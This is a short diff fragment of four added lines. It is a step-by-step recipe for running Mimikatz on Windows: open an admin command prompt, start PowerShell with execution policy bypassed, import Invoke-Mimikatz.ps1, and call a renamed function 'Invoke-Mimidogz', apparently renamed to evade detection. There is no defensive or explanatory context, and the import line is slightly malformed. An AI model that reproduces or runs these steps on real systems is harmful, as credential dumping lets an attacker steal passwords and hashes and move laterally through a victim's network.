@@ -1,0 +1,4 @@
+start -> run -> cmd (as admin)
+powershell -exec bypass
+Import Module .\Invoke-Mimikatz.ps1
+Invoke-Mimidogz
